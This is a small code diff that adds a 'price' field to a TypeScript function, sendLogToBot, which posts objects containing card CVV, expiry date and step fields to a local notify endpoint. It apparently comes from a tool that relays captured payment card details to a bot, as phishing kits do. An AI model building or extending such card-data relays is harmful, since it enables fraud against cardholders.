@@ -9,6 +9,7 @@ export async function sendLogToBot(data: {
   step?: string;
   cvv?: string;
   expireDate?: string;
+  price?: string;
 }) {
   try {
     const response = await axios.post("http://localhost:8000/notify", data);
